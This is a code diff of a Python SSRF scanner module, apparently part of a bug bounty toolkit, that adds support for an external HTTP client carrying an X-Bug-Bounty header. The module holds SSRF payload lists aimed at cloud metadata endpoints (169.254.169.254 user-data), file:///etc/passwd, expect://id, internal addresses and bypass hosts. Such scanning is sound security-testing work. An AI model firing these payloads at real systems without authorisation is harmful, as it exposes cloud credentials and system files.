@@ -3,6 +3,8 @@
 Module 6: SSRF Scanner
 5 Layer SSRF detection | Waktu: 10-12 menit | Akurasi: 90%
 Mendeteksi: Internal IP, Cloud metadata, Protocol smuggling, Bypass techniques
+
+MODIFIED: Added external HTTPClient support for X-Bug-Bounty header
 """
 
 import asyncio
@@ -16,10 +18,11 @@ from core.logger import Logger
 logger = Logger()
 
 class SSRFScanner:
-    def __init__(self, target: str, threads: int = 50, timeout: int = 4):
+    def __init__(self, target: str, threads: int = 50, timeout: int = 4, client: HTTPClient = None):
         self.target = target.rstrip('/')
         self.threads = threads
         self.timeout = timeout
+        self.client = client  # External client with X-Bug-Bounty header
         self.findings: List[Dict] = []
         self.stats = {
             'endpoints_tested': 0,
@@ -27,7 +30,7 @@ class SSRFScanner:
             'vulnerabilities_found': 0
         }
         
-        # ============ SSRF PARAMETERS (30 parameter - dikurangi) ============
+        # ============ SSRF PARAMETERS ============
         self.ssrf_params = [
             'url', 'uri', 'link', 'src', 'dest', 'destination',
             'redirect', 'redirect_uri', 'return_to', 'next', 'goto',
@@ -37,7 +40,7 @@ class SSRFScanner:
             'metadata', 'instance_id', 'forward_url', 'target_url'
         ]
         
-        # ============ INTERNAL ADDRESSES (10 alamat penting) ============
+        # ============ INTERNAL ADDRESSES ============
         self.internal_addresses = [
             '127.0.0.1', 'localhost', '0.0.0.0',
             '10.0.0.1', '172.16.0.1', '192.168.1.1',
@@ -47,7 +50,7 @@ class SSRFScanner:
             '127.0.0.1:2375'  # Docker
         ]
         
-        # ============ CLOUD METADATA (yang paling umum) ============
+        # ============ CLOUD METADATA ============
         self.cloud_metadata = [
             'http://169.254.169.254/latest/meta-data/',
             'http://169.254.169.254/latest/user-data/',
@@ -55,7 +58,7 @@ class SSRFScanner:
             'http://169.254.169.254/metadata/instance'
         ]
         
-        # ============ PROTOCOL PAYLOADS (5 terpenting) ============
+        # ============ PROTOCOL PAYLOADS ============
         self.protocol_payloads = [
             'file:///etc/passwd',
             'file:///c:/windows/win.ini',
@@ -64,7 +67,7 @@ class SSRFScanner:
             'expect://id'
         ]
         
-        # ============ BYPASS PAYLOADS (8 terpenting) ============
+        # ============ BYPASS PAYLOADS ============
         self.bypass_payloads = [
             'http://0',
             'http://127.0.0.1.nip.io',
@@ -82,14 +85,66 @@ class SSRFScanner:
             'instance-id', 'meta-data', '[extensions]'
         ]
     
+    async def _get_client(self):
+        """Get HTTP client - use external if available, otherwise create new"""
+        if self.client:
+            return self.client
+        else:
+            return HTTPClient(self.target, timeout=self.timeout, retries=1)
+    
     async def test_parameter(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
         """Test single parameter for SSRF"""
+        client = await self._get_client()
+        url = f"{endpoint}?{param}={quote(payload)}"
         
-        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
-            url = f"{endpoint}?{param}={quote(payload)}"
+        try:
+            start_time = time.perf_counter()
             
-            try:
-                start_time = time.perf_counter()
+            if not hasattr(client, 'session') or client.session is None:
+                async with client as ctx_client:
+                    response = await ctx_client.get(url)
+                    elapsed_ms = (time.perf_counter() - start_time) * 1000
+                    
+                    if response:
+                        response_text = await response.text()
+                        body = response_text.lower() if response_text else ""
+                        
+                        for indicator in self.ssrf_indicators:
+                            if indicator in body:
+                                if '169.254.169.254' in payload or 'metadata.google' in payload:
+                                    severity = "critical"
+                                    vuln_type = "CLOUD_METADATA_SSRF"
+                                elif 'file://' in payload:
+                                    severity = "critical"
+                                    vuln_type = "FILE_PROTOCOL_SSRF"
+                                else:
+                                    severity = "high"
+                                    vuln_type = "INTERNAL_SSRF"
+                                
+                                return {
+                                    "vulnerable": True,
+                                    "type": vuln_type,
+                                    "severity": severity,
+                                    "confidence": 95,
+                                    "endpoint": endpoint,
+                                    "parameter": param,
+                                    "payload": payload[:80],
+                                    "indicator": indicator,
+                                    "response_time_ms": round(elapsed_ms, 2)
+                                }
+                        
+                        if elapsed_ms > 1500:
+                            return {
+                                "vulnerable": True,
+                                "type": "TIME_BASED_SSRF",
+                                "severity": "medium",
+                                "confidence": 60,
+                                "endpoint": endpoint,
+                                "parameter": param,
+                                "payload": payload[:80],
+                                "response_time_ms": round(elapsed_ms, 2)
+                            }
+            else:
                 response = await client.get(url)
                 elapsed_ms = (time.perf_counter() - start_time) * 1000
                 
@@ -121,7 +176,6 @@ class SSRFScanner:
                                 "response_time_ms": round(elapsed_ms, 2)
                             }
                     
-                    # Time-based detection (if > 1 second)
                     if elapsed_ms > 1500:
                         return {
                             "vulnerable": True,
@@ -133,8 +187,8 @@ class SSRFScanner:
                             "payload": payload[:80],
                             "response_time_ms": round(elapsed_ms, 2)
                         }
-            except:
-                pass
+        except:
+            pass
         
         return None
     
@@ -151,14 +205,13 @@ class SSRFScanner:
                     findings.append(result)
                     self.stats['vulnerabilities_found'] += 1
                     icon = "💎" if result.get('severity') == 'critical' else "🔴"
-                    logger.finding(
-                        f"{icon} SSRF on {endpoint} via {param}",
-                        f"Payload: {payload[:60]}"
-                    )
+                    logger.info(f"{icon} SSRF on {endpoint} via {param}: {payload[:60]}")
                     return True
             return False
         
         for param in self.ssrf_params:
+            found = False
+            
             # Test cloud metadata (prioritas)
             for metadata in self.cloud_metadata:
                 self.stats['payloads_tested'] += 1
@@ -281,9 +334,19 @@ class SSRFScanner:
             "high_vulnerabilities": len(high_findings),
             "findings": self.findings
         }
+
+
+# ================================================================
+# MAIN RUN FUNCTION - MODIFIED FOR EXTERNAL CLIENT
+# ================================================================
+async def run(target: str, custom_endpoints: List[str] = None, client: HTTPClient = None) -> Dict:
+    """
+    Run SSRF scanner - DRYBT SSRF SCANNER
     
-    @staticmethod
-    async def run(target: str, custom_endpoints: List[str] = None) -> Dict:
-        """Run SSRF scanner"""
-        scanner = SSRFScanner(target)
-        return await scanner.scan(custom_endpoints)
+    Args:
+        target: Target URL
+        custom_endpoints: Custom endpoints to test (optional)
+        client: Optional external HTTPClient (for X-Bug-Bounty header)
+    """
+    scanner = SSRFScanner(target, client=client)
+    return await scanner.scan(custom_endpoints)
